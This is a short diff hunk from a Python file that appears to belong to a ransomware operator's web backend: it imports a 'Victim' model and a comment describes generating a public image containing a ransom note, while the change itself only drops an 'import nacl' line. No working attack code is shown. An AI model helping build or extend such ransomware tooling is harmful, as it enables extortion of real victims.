@@ -5,7 +5,6 @@ from werkzeug.security import check_password_hash
 from app.models import Victim, load_victim
 import random, os
 import base64
-import nacl
 
 # Automatically creates a image file with the specified ransom note
 # The image will be saved in a publicly available manner, so that an
